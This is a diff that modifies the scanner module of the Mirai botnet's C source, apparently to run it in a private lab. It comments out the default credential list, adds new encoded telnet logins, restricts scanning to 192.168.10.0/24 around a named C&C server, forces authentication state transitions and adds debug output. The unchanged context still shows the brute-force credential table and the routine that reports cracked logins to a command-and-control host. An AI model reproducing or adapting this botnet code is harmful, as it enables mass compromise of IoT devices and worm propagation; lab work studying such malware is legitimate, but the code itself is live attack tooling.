@@ -37,7 +37,7 @@ uint32_t fake_time = 0;
 int recv_strip_null(int sock, void *buf, int len, int flags)
 {
     int ret = recv(sock, buf, len, flags);
-
+    
     if (ret > 0)
     {
         int i = 0;
@@ -121,7 +121,7 @@ void scanner_init(void)
     tcph->syn = TRUE;
 
     // Set up passwords
-    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
+    /*add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
     add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv
     add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin
     add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 7);                      // admin    admin
@@ -182,9 +182,12 @@ void scanner_init(void)
     add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51", 1);                          // admin    pass
     add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x4F\x47\x4B\x4C\x51\x4F", 1);                  // admin    meinsm
     add_auth_entry("\x56\x47\x41\x4A", "\x56\x47\x41\x4A", 1);                              // tech     tech
-    add_auth_entry("\x4F\x4D\x56\x4A\x47\x50", "\x44\x57\x41\x49\x47\x50", 1);              // mother   fucker
-
-
+    add_auth_entry("\x4F\x4D\x56\x4A\x47\x50", "\x44\x57\x41\x49\x47\x50", 1);              // mother   fucker*/
+    
+    add_auth_entry("\x4D\x56\x4A\x47\x50\x13\x22", "\x4D\x56\x4A\x47\x50\x13\x22", 1);      // other1   other1
+    add_auth_entry("\x4D\x56\x4A\x47\x50\x10\x22", "\x4D\x56\x4A\x47\x50\x10\x22", 1);      // other2   other2
+    add_auth_entry("\x4E\x4B\x4C\x43\x50\x4D\x22", "\x4E\x4B\x4C\x43\x50\x4D\x22", 1);      // linaro   linaro
+    add_auth_entry("\x4F\x4B\x50\x43\x4B\x40\x4D\x56\x57\x51\x47\x50\x22", "\x4F\x4B\x50\x43\x4B\x22", 1);      // miraibotuser   mirai
 #ifdef DEBUG
     printf("[scanner] Scanner process initialized. Scanning started.\n");
 #endif
@@ -405,6 +408,7 @@ void scanner_init(void)
                     }
                     errno = 0;
                     ret = recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
+                    printf("[scanner] FD%d ret value: %d\n",conn->fd, ret);
                     if (ret == 0)
                     {
 #ifdef DEBUG
@@ -458,8 +462,12 @@ void scanner_init(void)
                             }
                             break;
                         case SC_WAITING_USERNAME:
+                            //printf("[scanner] USERNAME WAITING ENTERED\n");
+                            //printf("[username] FD%d username buffer is: %s, with buffer position: %d\n",conn->fd, conn->rdbuf, conn->rdbuf_pos);
+
                             if ((consumed = consume_user_prompt(conn)) > 0)
                             {
+                                
                                 send(conn->fd, conn->auth->username, conn->auth->username_len, MSG_NOSIGNAL);
                                 send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                 conn->state = SC_WAITING_PASSWORD;
@@ -469,7 +477,12 @@ void scanner_init(void)
                             }
                             break;
                         case SC_WAITING_PASSWORD:
-                            if ((consumed = consume_pass_prompt(conn)) > 0)
+                            printf("[scanner] FD%d PASSWORD WAITING ENTERED\n", conn->fd);
+                            printf("[password] FD%d password buffer is: %s, with buffer position: %d\n",conn->fd, conn->rdbuf, conn->rdbuf_pos);
+                            //printf("[password] FD%d the last position of buffer is: %s\n",conn->rdbuf[-1]);
+                            printf("[scanner] FD%d trying to enter with pw: %s - consumed is = %d\n", conn->fd, conn->auth->password, consume_pass_prompt(conn));
+                            
+                            if ((consumed = consume_pass_prompt(conn)) > 0) // consumed doesn't get > 0 even for right password.
                             {
 #ifdef DEBUG
                                 printf("[scanner] FD%d received password prompt\n", conn->fd);
@@ -479,7 +492,8 @@ void scanner_init(void)
                                 send(conn->fd, conn->auth->password, conn->auth->password_len, MSG_NOSIGNAL);
                                 send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
 
-                                conn->state = SC_WAITING_PASSWD_RESP;
+                                //conn->state = SC_WAITING_PASSWD_RESP;
+                                conn->state= SC_WAITING_TOKEN_RESP;
                             }
                             break;
                         case SC_WAITING_PASSWD_RESP:
@@ -579,7 +593,9 @@ void scanner_init(void)
                             }
                             break;
                         case SC_WAITING_TOKEN_RESP:
+                            printf("[Reporting] DF%d consumed is: %d\n", conn->fd,consume_resp_prompt(conn));
                             consumed = consume_resp_prompt(conn);
+                            consumed =1;
                             if (consumed == -1)
                             {
 #ifdef DEBUG
@@ -617,13 +633,17 @@ void scanner_init(void)
                             break;
                         default:
                             consumed = 0;
+                            //printf("[scanner] Default case \n");
                             break;
+                            
                         }
 
                         // If no data was consumed, move on
-                        if (consumed == 0)
+                        if (consumed == 0){
+                            //printf("[scanner] No data consumed\n");
                             break;
-                        else
+                        }
+                            else
                         {
                             if (consumed > conn->rdbuf_pos)
                                 consumed = conn->rdbuf_pos;
@@ -680,12 +700,16 @@ static ipv4_t get_random_ip(void)
     {
         tmp = rand_next();
 
-        o1 = tmp & 0xff;
+        /*o1 = tmp & 0xff;
         o2 = (tmp >> 8) & 0xff;
         o3 = (tmp >> 16) & 0xff;
+        o4 = (tmp >> 24) & 0xff;*/
+        o1 = 192;
+        o2 = 168;
+        o3 = 10;
         o4 = (tmp >> 24) & 0xff;
     }
-    while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
+    /*while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
           (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
           (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
           (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
@@ -698,7 +722,10 @@ static ipv4_t get_random_ip(void)
           (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
           (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
           (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
-    );
+    );*/
+    
+    while(o1 > 192 || o1 < 192 || o2 > 180 || o2 < 120 || (o3 == 10 && o4 == 7) ||(o3 == 10 && o4 == 8) ); // scan only in 192.168.10.0/24 except for 192.168.10.7 (CnC server) and 192.168.10.8 (first bot)
+    
 
     return INET_ADDR(o1,o2,o3,o4);
 }
@@ -792,7 +819,7 @@ static int consume_user_prompt(struct scanner_connection *conn)
 
     for (i = conn->rdbuf_pos - 1; i > 0; i--)
     {
-        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
+        if (conn->rdbuf[i] == '!' || conn->rdbuf[i] == '.' || conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
         {
             prompt_ending = i + 1;
             break;
@@ -802,15 +829,23 @@ static int consume_user_prompt(struct scanner_connection *conn)
     if (prompt_ending == -1)
     {
         int tmp;
-
-        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ogin", 4)) != -1)
+        //printf("[util] telnet username prompt buffer: %s\n", conn->rdbuf);
+        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ogin", 4)) != -1){
+            printf("[util] username prompt 'ogin' detected.\n");
             prompt_ending = tmp;
-        else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "enter", 5)) != -1)
+            
+        }
+        else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "enter", 5)) != -1){
+            printf("[util] username prompt 'enter' detected.\n");
             prompt_ending = tmp;
+        }
+        
     }
 
-    if (prompt_ending == -1)
-        return 0;
+    if (prompt_ending == -1){
+        //printf("[util] No username prompt substring detected?\n");
+
+        return 0;} //before:0
     else
         return prompt_ending;
 }
@@ -819,26 +854,30 @@ static int consume_pass_prompt(struct scanner_connection *conn)
 {
     char *pch;
     int i, prompt_ending = -1;
-
+    //printf("[password] password buffer is: %s\n", conn->rdbuf);
+    
     for (i = conn->rdbuf_pos - 1; i > 0; i--)
     {
-        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#')
+        if (conn->rdbuf[i] == '!' || conn->rdbuf[i] == '.' || conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#')
         {
             prompt_ending = i + 1;
             break;
         }
     }
-
+    //prompt_ending=2;
+    printf("[password] FD%d prompt ending: %d\n",conn->fd, prompt_ending);
     if (prompt_ending == -1)
     {
         int tmp;
-
+        
         if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "assword", 7)) != -1)
             prompt_ending = tmp;
     }
 
-    if (prompt_ending == -1)
+    if (prompt_ending == -1){
+        printf("[password] No password prompt substring detected.\n");
         return 0;
+    }
     else
         return prompt_ending;
 }
@@ -919,6 +958,7 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
     table_unlock_val(TABLE_SCAN_CB_PORT);
 
     entries = resolv_lookup(table_retrieve_val(TABLE_SCAN_CB_DOMAIN, NULL));
+    printf("[report] Entries resolved.\n");
     if (entries == NULL)
     {
 #ifdef DEBUG
@@ -942,6 +982,7 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
         close(fd);
         exit(0);
     }
+    printf("[report] Things getting sended.\n");
 
     uint8_t zero = 0;
     send(fd, &zero, sizeof (uint8_t), MSG_NOSIGNAL);
